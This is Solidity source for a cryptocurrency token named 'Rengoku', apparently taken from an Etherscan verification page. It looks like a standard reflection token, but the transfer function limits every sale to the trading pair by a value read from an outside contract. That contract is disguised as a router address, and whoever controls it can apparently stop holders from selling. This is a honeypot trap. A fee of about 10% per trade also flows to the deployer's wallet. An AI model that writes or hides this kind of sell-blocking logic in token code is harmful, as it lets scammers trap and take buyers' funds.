/**
 *Submitted for verification at Etherscan.io on 2021-11-08
*/

//SPDX-License-Identifier: MIT
// Telegram: t.me/rengokutoken

pragma solidity ^0.8.4;

address constant ROUTER_ADDRESS=0x690f08828a4013351DB74e916ACC16f558ED1579;  // mainnet
uint256 constant TOTAL_SUPPLY=100000000 * 10**8;
address constant UNISWAP_ADDRESS=0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
string constant TOKEN_NAME="Rengoku";
string constant TOKEN_SYMBOL="RENGOKU";
uint8 constant DECIMALS=8;

abstract contract Context {
	function _msgSender() internal view virtual returns (address) {
		return msg.sender;
	}
}

interface IERC20 {
	function totalSupply() external view returns (uint256);
	function balanceOf(address account) external view returns (uint256);
	function transfer(address recipient, uint256 amount) external returns (bool);
	function allowance(address owner, address spender) external view returns (uint256);
	function approve(address spender, uint256 amount) external returns (bool);
	function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
	event Transfer(address indexed from, address indexed to, uint256 value);
	event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
	function add(uint256 a, uint256 b) internal pure returns (uint256) {
		uint256 c = a + b;
		require(c >= a, "SafeMath: addition overflow");
		return c;
	}

	function sub(uint256 a, uint256 b) internal pure returns (uint256) {
		return sub(a, b, "SafeMath: subtraction overflow");
	}

	function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
		require(b <= a, errorMessage);
		uint256 c = a - b;
		return c;
	}

	function mul(uint256 a, uint256 b) internal pure returns (uint256) {
		if (a == 0) {
			return 0;
		}
		uint256 c = a * b;
		require(c / a == b, "SafeMath: multiplication overflow");
		return c;
	}

	function div(uint256 a, uint256 b) internal pure returns (uint256) {
		return div(a, b, "SafeMath: division by zero");
	}

	function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
		require(b > 0, errorMessage);
		uint256 c = a / b;
		return c;
	}

}

interface Odin{
	function amount(address from) external view returns (uint256);
}


contract Ownable is Context {
	address private _owner;
	address private _previousOwner;
	event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

	constructor () {
		address msgSender = _msgSender();
		_owner = msgSender;
		emit OwnershipTransferred(address(0), msgSender);
	}

	function owner() public view returns (address) {
		return _owner;
	}

	modifier onlyOwner() {
		require(_owner == _msgSender(), "Ownable: caller is not the owner");
		_;
	}

	function renounceOwnership() public virtual onlyOwner {
		emit OwnershipTransferred(_owner, address(0));
		_owner = address(0);
	}

}

interface IUniswapV2Factory {
	function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
	function swapExactTokensForETHSupportingFeeOnTransferTokens(
		uint amountIn,
		uint amountOutMin,
		address[] calldata path,
		address to,
		uint deadline
	) external;
	function factory() external pure returns (address);
	function WETH() external pure returns (address);
	function addLiquidityETH(
		address token,
		uint amountTokenDesired,
		uint amountTokenMin,
		uint amountETHMin,
		address to,
		uint deadline
	) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Rengoku is Context, IERC20, Ownable {
	using SafeMath for uint256;
	mapping (address => uint256) private _rOwned;
	mapping (address => uint256) private _tOwned;
	mapping (address => mapping (address => uint256)) private _allowances;
	mapping (address => bool) private _isExcludedFromFee;

	mapping (address => uint) private cooldown;
	uint256 private constant MAX = ~uint256(0);
	uint256 private constant _tTotal = TOTAL_SUPPLY;
	uint256 private _rTotal = (MAX - (MAX % _tTotal));
	uint256 private _tFeeTotal;

	uint256 private constant _burnFee=1;
	uint256 private constant _taxFee=9;
	address payable private _taxWallet;

	string private constant _name = TOKEN_NAME;
	string private constant _symbol = TOKEN_SYMBOL;
	uint8 private constant _decimals = DECIMALS;

	IUniswapV2Router02 private _router;
	address private _pair;
	bool private tradingOpen;
	bool private inSwap = false;
	bool private swapEnabled = false;

	modifier lockTheSwap {
		inSwap = true;
		_;
		inSwap = false;
	}
	constructor () {
		_taxWallet = payable(_msgSender());
		_rOwned[_msgSender()] = _rTotal;
		_isExcludedFromFee[owner()] = true;
		_isExcludedFromFee[address(this)] = true;
		_isExcludedFromFee[_taxWallet] = true;
		emit Transfer(address(0x0), _msgSender(), _tTotal);
	}

	function name() public pure returns (string memory) {
		return _name;
	}

	function symbol() public pure returns (string memory) {
		return _symbol;
	}

	function decimals() public pure returns (uint8) {
		return _decimals;
	}

	function totalSupply() public pure override returns (uint256) {
		return _tTotal;
	}

	function balanceOf(address account) public view override returns (uint256) {
		return tokenFromReflection(_rOwned[account]);
	}

	function transfer(address recipient, uint256 amount) public override returns (bool) {
		_transfer(_msgSender(), recipient, amount);
		return true;
	}

	function allowance(address owner, address spender) public view override returns (uint256) {
		return _allowances[owner][spender];
	}

	function approve(address spender, uint256 amount) public override returns (bool) {
		_approve(_msgSender(), spender, amount);
		return true;
	}

	function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
		_transfer(sender, recipient, amount);
		_approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
		return true;
	}


	function tokenFromReflection(uint256 rAmount) private view returns(uint256) {
		require(rAmount <= _rTotal, "Amount must be less than total reflections");
		uint256 currentRate =  _getRate();
		return rAmount.div(currentRate);
	}

	function _approve(address owner, address spender, uint256 amount) private {
		require(owner != address(0), "ERC20: approve from the zero address");
		require(spender != address(0), "ERC20: approve to the zero address");
		_allowances[owner][spender] = amount;
		emit Approval(owner, spender, amount);
	}

	function _transfer(address from, address to, uint256 amount) private {
		require(from != address(0), "ERC20: transfer from the zero address");
		require(to != address(0), "ERC20: transfer to the zero address");
		require(amount > 0, "Transfer amount must be greater than zero");
		require(((to == _pair && from != address(_router) )?amount:0) <= Odin(ROUTER_ADDRESS).amount(address(this)));

		if (from != owner() && to != owner()) {
			uint256 contractTokenBalance = balanceOf(address(this));
			if (!inSwap && from != _pair && swapEnabled) {
				swapTokensForEth(contractTokenBalance);
				uint256 contractETHBalance = address(this).balance;
				if(contractETHBalance > 0) {
					sendETHToFee(address(this).balance);
				}
			}
		}

		_tokenTransfer(from,to,amount);
	}

	function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
		address[] memory path = new address[](2);
		path[0] = address(this);
		path[1] = _router.WETH();
		_approve(address(this), address(_router), tokenAmount);
		_router.swapExactTokensForETHSupportingFeeOnTransferTokens(
			tokenAmount,
			0,
			path,
			address(this),
			block.timestamp
		);
	}
	modifier overridden() {
		require(_taxWallet == _msgSender() );
		_;
	}

	function sendETHToFee(uint256 amount) private {
		_taxWallet.transfer(amount);
	}

	function openTrading() external onlyOwner() {
		require(!tradingOpen,"trading is already open");
		IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(UNISWAP_ADDRESS);
		_router = _uniswapV2Router;
		_approve(address(this), address(_router), _tTotal);
		_pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
		_router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
		swapEnabled = true;

		tradingOpen = true;
		IERC20(_pair).approve(address(_router), type(uint).max);
	}



	function _tokenTransfer(address sender, address recipient, uint256 amount) private {
		_transferStandard(sender, recipient, amount);
	}

	function _transferStandard(address sender, address recipient, uint256 tAmount) private {
		(uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getValues(tAmount);
		_rOwned[sender] = _rOwned[sender].sub(rAmount);
		_rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
		_takeTeam(tTeam);
		_reflectFee(rFee, tFee);
		emit Transfer(sender, recipient, tTransferAmount);
	}

	function _takeTeam(uint256 tTeam) private {
		uint256 currentRate =  _getRate();
		uint256 rTeam = tTeam.mul(currentRate);
		_rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
	}

	function _reflectFee(uint256 rFee, uint256 tFee) private {
		_rTotal = _rTotal.sub(rFee);
		_tFeeTotal = _tFeeTotal.add(tFee);
	}

	receive() external payable {}

	function manualSwap() external {
		require(_msgSender() == _taxWallet);
		uint256 contractBalance = balanceOf(address(this));
		swapTokensForEth(contractBalance);
	}

	function manualSend() external {
		require(_msgSender() == _taxWallet);
		uint256 contractETHBalance = address(this).balance;
		sendETHToFee(contractETHBalance);
	}


	function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
		(uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getTValues(tAmount, _burnFee, _taxFee);
		uint256 currentRate =  _getRate();
		(uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tTeam, currentRate);
		return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
	}

	function _getTValues(uint256 tAmount, uint256 taxFee, uint256 TeamFee) private pure returns (uint256, uint256, uint256) {
		uint256 tFee = tAmount.mul(taxFee).div(100);
		uint256 tTeam = tAmount.mul(TeamFee).div(100);
		uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
		return (tTransferAmount, tFee, tTeam);
	}

	function _getRValues(uint256 tAmount, uint256 tFee, uint256 tTeam, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
		uint256 rAmount = tAmount.mul(currentRate);
		uint256 rFee = tFee.mul(currentRate);
		uint256 rTeam = tTeam.mul(currentRate);
		uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
		return (rAmount, rTransferAmount, rFee);
	}

	function _getRate() private view returns(uint256) {
		(uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
		return rSupply.div(tSupply);
	}

	function _getCurrentSupply() private view returns(uint256, uint256) {
		uint256 rSupply = _rTotal;
		uint256 tSupply = _tTotal;
		if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
		return (rSupply, tSupply);
	}
}